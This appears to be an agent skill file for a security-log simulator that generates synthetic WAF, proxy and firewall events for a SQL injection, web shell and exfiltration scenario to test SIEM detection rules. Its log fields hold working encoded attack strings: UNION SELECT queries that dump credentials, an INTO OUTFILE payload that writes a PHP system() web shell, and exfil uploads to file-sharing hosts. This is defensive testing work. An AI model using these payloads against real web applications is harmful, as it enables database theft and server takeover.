---
name: web_app_to_webshell_to_exfil
displayName: Web shell exfiltration
category: scenarios
description: 'Four-stage external-to-data-loss chain. Stage 1: WAF noise (probes, sqlmap, common exploit signatures). Stage 2: successful SQL injection (200 response after exploit). Stage 3: web shell upload + first interaction. Stage 4: outbound data exfil from compromised web tier to file-sharing service. Vendor-agnostic — agent resolves vendor/product from the operator''s installed data sources at runtime. Triggers 3 XSIAM rules: SQL Injection Attempt, Web Shell Deployment, Data Exfiltration to Personal Cloud Storage.'
icon: bug_report
source: platform
loadingMode: on-demand
locked: false
attack:
  - 'TA0001: Initial Access (T1190 Exploit Public-Facing Application)'
  - 'TA0002: Execution (T1059.004 Unix Shell, T1505.003 Web Shell)'
  - 'TA0003: Persistence (T1505.003 Web Shell)'
  - 'TA0010: Exfiltration (T1567 Exfiltration Over Web Service, T1041 Exfiltration Over C2)'
---

# Skill: Web app compromise → Web shell → Data exfiltration

## Category

scenarios

## Attack Type

Public-facing web app exploitation followed by post-exploitation persistence and data theft. Models the most common externally-discoverable compromise pattern: WAF logs reveal the probe phase, the successful exploit, the web shell drop, and finally the egress when the attacker pulls data out.

**See also `recon_to_account_probe`** — a different attacker profile against the same illustrative
target (`app.corp.example` / `10.10.30.10`): lighter, targeted WAF probing that does NOT succeed
and instead pivots into account-probing at the VPN portal. Run both to demonstrate that detection
covers both outcomes — probing that gets stopped and probing that doesn't — but they intentionally
use different source IPs and are not meant to be chained as one incident.

## MITRE ATT&CK Tactics

- TA0001: Initial Access (T1190 Exploit Public-Facing Application)
- TA0002: Execution (T1059.004 Unix Shell, T1505.003 Web Shell)
- TA0003: Persistence (T1505.003 Web Shell)
- TA0010: Exfiltration (T1567 Exfiltration Over Web Service, T1041 Exfiltration Over C2)

## XSIAM analytics rules triggered

| # | Rule | Stage |
|---|---|---|
| 15 | SQL Injection Attempt | Stages 1 + 2 |
| 16 | Web Shell Deployment | Stage 3 |
| 20 | Data Exfiltration to Personal Cloud Storage | Stage 4 |

## Data classes used

| Stage | Data class | If missing |
|---|---|---|
| 1, 2, 3 | `waf` | Required — entire skill keys on WAF telemetry |
| 3, 4 | `proxy` OR `firewall` | Either works; proxy preferred for outbound visibility |
| 4 | `firewall` | Confirms outbound flow at the perimeter |

## Pre-flight

**Resolve the destination as a store reference.** Call `log_destinations_list` once and take the
`id` of the operator's default (or only) destination, then pass `destination: "logdest:<id>"`.
The platform resolves the reference server-side and injects any credentials, so secrets never
cross the agent surface. **Never pass a destination's `type` (`syslog`) — that is not an accepted
value** — and never hardcode a broker host/port. Accepted forms are `logdest:<id>` (preferred),
a raw `udp:host:port` for a one-shot the operator names explicitly, or `XSIAM_WEBHOOK` (legacy).
Destination selection is independent of the data-source vendor/product lookup below.

**Make the events vendor-faithful.** For each class you will emit, call
`data_sources_get_schema(<entry>.data_source_id, compact=true)` and pass the returned `fields[]`
verbatim as `schema_override` on that stage's worker. Without it the worker emits generic
observables that the vendor's modeling rule cannot map, so events land raw and `xdm.*` stays
empty. `compact=true` is lossless for this purpose and keeps the payload inside the tool-result cap.

### Class check (MANDATORY — before creating any worker)

1. Call `data_sources_installed_as_vendors` once. Group `vendors[]` by `data_source_class`.
2. For every row of the "Data classes used" table, write down the installed entry you will use for it, or `MISSING`. A class is only covered by an installed entry. A generic or catch-all schema is never a substitute, and never guess a vendor/product for a class.
3. `waf` (Stages 1-3) is required. If it is `MISSING`, say this to the operator, with the class filled in: "No installed data source covers the `<class>` class, so I cannot run the web shell exfiltration scenario. Install a `<class>` data source from the Marketplace and ask again." Then stop: create no worker.
   If `proxy` is `MISSING`, use the installed `firewall` entry for Stages 3-4 and say so (outbound visibility is reduced: no URL category, no user context). If neither `proxy` nor `firewall` is installed, skip the outbound legs of Stages 3 and 4 with this sentence: "No installed data source covers the `<class>` class, so I am skipping Stage <N> (<stage name>). I will not generate it with a generic schema. Install a `<class>` data source from the Marketplace to include it."
4. In your final report, list every stage you skipped or substituted and which of the alerts above will therefore not fire.

## Narrative thread

- **Attacker source IP:** `203.0.113.42` (single fixed source; no need for distributed pattern)
- **Target web app:** `https://app.corp.example` (front-end at `10.10.30.10`)
- **Vulnerable endpoint:** `/search.php?id=` (classic union-based SQLi)
- **WAF policy bypass payload:** uses double-URL-encoded UNION SELECT against the user table
- **Web shell drop path:** `/uploads/img.php` (innocuous-looking)
- **Web shell name:** `img.php` (1.4 KB; PHP backdoor using `system()` for command exec)
- **Compromised web server:** `web-app-01` at `10.10.30.10`
- **Exfil destination:** `paste.dropfiles.io` (file-sharing service, attacker-controlled)
- **Wall-clock time:** Stage 1 ~15 min noise. Stage 2 ~3 min focused exploit. Stage 3 ~5 min from drop to first call. Stage 4 ~10 min of bulk extraction.

---

### Stage 1 — WAF probe noise — ~80 events over 15 minutes

Reconnaissance and automated scan traffic. The attacker fingerprints the app and runs a sqlmap-style scan: dozens of payload variations against the search endpoint. Most are blocked or 4xx-d.

**Data class:** `waf`

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[waf].vendor>
  product: <stack[waf].product>
  count:    80
  interval: 11
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    src:        ["203.0.113.42"]
    dst:        ["10.10.30.10"]
    spt:      ["49152", "51234", "57890", "60123"]
    dpt:      ["443"]
    proto:      ["6"]
    request:           ["/search.php?id=1", "/search.php?id=1'",
                    "/search.php?id=1%20OR%201%3D1",
                    "/search.php?id=1%27%20UNION%20SELECT%20null--",
                    "/admin/login.php", "/.env", "/wp-admin/", "/phpmyadmin/",
                    "/search.php?id=1%27%20AND%20SLEEP%285%29--",
                    "/api/users?id=1%20UNION%20ALL%20SELECT%20null,null,null--"]
    requestMethod:        ["GET", "POST"]
    httpStatusCode:   ["403", "404", "200", "200"]
    requestClientApplication:    ["sqlmap/1.7.2#stable (https://sqlmap.org)",
                    "Mozilla/5.0 (X11; Linux x86_64)",
                    "curl/7.81.0",
                    "Mozilla/5.0 (compatible; nmap/7.94)"]
    act:        ["block", "alert", "allow"]
    attackType:   ["sql-injection", "directory-traversal",
                    "scanner-fingerprint", "common-vulnerabilities"]
    attackSeverity: ["high", "medium"]
    ruleId:       ["942100", "942130", "942200", "942110",
                    "930120", "930100", "920270"]
    ruleName:     ["SQL Injection Attack: Common Injection Testing Detected",
                    "SQL Injection Attack Detected via libinjection",
                    "Restricted File Access Attempt",
                    "Possible Common Backdoor Path Probed"]
    out:     ["480", "640"]
    in: ["240", "1280"]
    country:       ["unknown"]
    threatScore:  ["75", "82", "65"]
```

**Field semantics:**
- `user_agent: sqlmap/1.7.2#stable` — sqlmap leaves a default UA; competent attackers spoof it but automated scans typically don't bother
- `action: block / alert / allow` — most payloads get blocked or alert; a few "allow" entries represent the WAF letting low-severity probes through (which is realistic; not every WAF rule blocks)
- `rule_id` — OWASP CRS rule IDs (942100 series = SQLi, 930100 = LFI, 920270 = invalid URL chars). Including real rule IDs makes the recipe land naturally in WAF parsers
- `attack_type` — the WAF's classification taxonomy

**Why this fires Rule #15 (early-warning):** the SQL-injection rule fires here based on raw count of `attack_type=sql-injection` events from one source within 15 min. Modern WAFs pre-suppress this on a 1-source basis (assuming you'd want a network-wide aggregation), but the count from this one source crosses thresholds for "single-IP SQLi probe attack" rules.

---

### Stage 2 — Successful SQL injection (200 response) — ~5 events over 3 minutes

After noise, the attacker finds a payload the WAF doesn't catch (typically a less-obvious encoding, e.g., double-URL-encoded with comment-based bypass). The WAF logs the payload as ALLOWED and the backend responds 200 with sensitive data in the body.

**Data class:** `waf`

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[waf].vendor>
  product: <stack[waf].product>
  count:    5
  interval: 30
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    src:        ["203.0.113.42"]
    dst:        ["10.10.30.10"]
    spt:      ["49152", "51234", "57890", "60123"]
    dpt:      ["443"]
    proto:      ["6"]
    request:           ["/search.php?id=1%2527%2520UNION%2520SELECT%2520username,password,email%2520FROM%2520users%252D%252D%2520",
                    "/search.php?id=1%2527%2520UNION%2520SELECT%2520table_name,null,null%2520FROM%2520information_schema.tables%252D%252D%2520"]
    requestMethod:        ["GET"]
    httpStatusCode:   ["200"]
    requestClientApplication:    ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"]
    act:        ["allow"]
    attackType:   ["sql-injection"]
    attackSeverity: ["high"]
    ruleId:       ["942180"]
    ruleName:     ["Detects basic SQL authentication bypass attempts"]
    out:    ["920"]
    in: ["12480", "8960", "15240"]
    threatScore:  ["95"]
    anomalyScore: ["88"]
```

**Field semantics:**
- `url` — double-URL-encoded payload (`%2527` = encoded `'`; `%2520` = encoded space) bypasses many simple WAF signatures
- `action: allow` — the bypass succeeded
- `bytes_received: 12480 / 8960 / 15240` — much larger than typical search responses (hundreds of bytes); the abnormal response size is the "exfil-via-SELECT" signal
- `anomaly_score` — modern WAFs ML-score anomalies; 88 is high
- The 5 events represent: union-based SELECT with column probing, table enumeration, then 3 data-extraction queries

**Why this combines with Rule #15:** Stage 1 fires "SQLi probe" alerts; Stage 2's `action=allow` + abnormally large `bytes_received` for a SQLi-shaped URL produces "Successful SQL Injection" — a higher-severity rule that fires when previous probes against the same target succeed.

---

### Stage 3 — Web shell upload + first call — ~12 events over 5 minutes

After data extraction, the attacker uses one of the SQL injections to write a PHP file to disk via `INTO OUTFILE` (or via an upload endpoint they enumerated). They then make their first call to it. The webshell uses PHP's `system()` function for command execution — one of the classic webshell patterns (along with `passthru`, `shell_exec`).

**Sub-stage 3A — web shell drop**

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[waf].vendor>
  product: <stack[waf].product>
  count:    2
  interval: 30
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    src:        ["203.0.113.42"]
    dst:        ["10.10.30.10"]
    request:           ["/uploads/img.php?test=1",
                    "/search.php?id=1%2527%2520UNION%2520SELECT%2520%2522%253C%253Fphp%2520system%2528%2524_POST%255B%2522pw%2522%255D%2529%253B%253F%253E%2522%2520INTO%2520OUTFILE%2520%2522%252Fvar%252Fwww%252Fhtml%252Fuploads%252Fimg.php%2522--%2520"]
    requestMethod:        ["GET"]
    httpStatusCode:   ["200", "404"]
    requestClientApplication:    ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"]
    act:        ["allow"]
    attackType:   ["sql-injection", "webshell-creation"]
    attackSeverity: ["critical"]
    ruleId:       ["942190", "933100"]
    ruleName:     ["Detects MSSQL code execution and information gathering attempts",
                    "Possible PHP Backdoor / WebShell Pattern Detected"]
    in: ["480", "12"]
```

**Sub-stage 3B — web shell first call (post-shell)**

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[waf].vendor>
  product: <stack[waf].product>
  count:    10
  interval: 24
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    src:        ["203.0.113.42"]
    dst:        ["10.10.30.10"]
    request:           ["/uploads/img.php"]
    requestMethod:        ["POST"]
    httpStatusCode:   ["200"]
    requestClientApplication:    ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "curl/7.81.0",
                    "Wget/1.21.3 (linux-gnu)"]
    act:        ["allow"]
    attackType:   ["webshell-interaction"]
    attackSeverity: ["critical"]
    ruleId:       ["933100", "933110"]
    ruleName:     ["PHP Webshell Activity Detected"]
    out:     ["840", "920", "1240", "780"]
    in: ["4280", "8960", "12480", "15240", "18920"]
    contentType:   ["application/x-www-form-urlencoded"]
    anomalyScore:  ["94"]
```

**Field semantics:**
- `url: /uploads/img.php` — innocuous-looking path; a `.php` file in `/uploads/` is suspicious because uploads should typically be media (jpg, png, pdf), not executable PHP
- `method: POST` — webshells are typically called via POST so command output isn't in the URL bar / referrer logs
- `user_agent` — varies (browser sometimes, curl other times) — webshells are called both manually by the attacker and programmatically by their tooling
- `bytes_sent` (request) and `bytes_received` (response) — the response sizes (4-20 KB) are larger than legitimate file fetches; web shells return command output

**Why this fires Rule #16:**
- The `INTO OUTFILE` + PHP-handler pattern in the URL triggers webshell-creation detection
- Subsequent POSTs to `.php` files in `/uploads/` directories with growing response sizes match webshell-interaction patterns
- Combined with Stage 2's successful SQLi from same `src_ip`, the SIEM stitches "SQLi → webshell drop → webshell call" into one incident

---

### Stage 4 — Data exfiltration from compromised web tier — ~25 events over 10 minutes

The attacker uses the webshell to package the stolen DB content and the application source into archives, then exfiltrates them via outbound HTTPS to a file-sharing service.

**Sub-stage 4A — proxy / outbound connections**

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[proxy].vendor>
  product: <stack[proxy].product>
  count:    15
  interval: 38
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    src:        ["10.10.30.10"]
    shost:      ["web-app-01"]
    request:           ["https://paste.dropfiles.io/upload",
                    "https://api.dropfiles.io/v2/objects",
                    "https://transfer.sh/?action=upload"]
    requestMethod:        ["POST", "PUT"]
    httpStatusCode:   ["200", "201"]
    requestClientApplication:    ["curl/7.81.0", "Wget/1.21.3"]
    act:        ["allow"]
    out:    ["10485760", "20971520", "5242880", "8388608"]
    in: ["240", "180"]
    contentType:  ["application/octet-stream", "application/zip"]
    cat:      ["file-sharing", "personal-cloud-storage", "uncategorized"]
    threatScore:  ["55", "70"]
    dhost:        ["paste.dropfiles.io", "transfer.sh"]
```

**Sub-stage 4B — firewall confirmation**

```yaml
xlog.create_data_worker:
  type:    CEF
  vendor:  <stack[firewall].vendor>
  product: <stack[firewall].product>
  count:    1
  interval: 60
  max_events: 10
  destination: logdest:<id from log_destinations_list>
  observables_dict:
    src:        ["10.10.30.10"]
    dst:        ["104.21.x.x", "172.67.x.x"]
    dpt:      ["443"]
    proto:      ["6"]
    act:        ["allow"]
    app:           ["ssl"]
    out:    ["10485760", "20971520"]
    country:       ["US"]
    threatCategory: ["file-sharing"]
```

**Field semantics:**
- `src_ip: 10.10.30.10` — the WEB SERVER initiates the outbound, not a workstation. Web servers should rarely make outbound HTTPS calls (occasionally to package mirrors, never to file-sharing services)
- `bytes_sent` — multi-MB payloads (5-20 MB chunks) — way outside the normal "API call" range web tier logs see
- `category: file-sharing` — proxy classification of the destination
- The unusual EGRESS direction (server → external) on a server that should only see INGRESS is the strongest single signal

**Why this fires Rule #20:** the combination of (a) outbound from a web server (anomalous direction), (b) destination categorized as file-sharing, (c) multi-MB payload sizes, (d) within minutes of a web shell call from the same server, gives high-confidence exfiltration detection. Some SIEMs trigger on (c) alone for web-tier sources.

---

## Verification

| Indicator | Where to check |
|---|---|
| SQLi probe alerts (high count) from `203.0.113.42` | XSIAM Issues |
| Successful SQLi alert with `action=allow` + large response | XSIAM Issues |
| Webshell deployment alert against `/uploads/img.php` | XSIAM Issues |
| Exfiltration alert: web-app-01 → file-sharing destination | XSIAM Issues |
| Pivotable: filter `dst_ip=10.10.30.10`, see all phases on one timeline | XQL: `config timeframe = 24h \| dataset = <dataset_name of the waf entry> \| filter <its destination-IP field> = "10.10.30.10" \| limit 20` |

## Tear-down

```yaml
xlog.list_workers:
xlog.kill_worker:
  worker_id: <each>
```

## Adapting per deployment

The `/search.php` endpoint is illustrative. For exercises tied to a real customer's app, replace with whatever endpoint they want exercised (their `/api/v1/users`, `/login.aspx`, etc.). The chain shape (probe → bypass → webshell → exfil) is endpoint-agnostic.
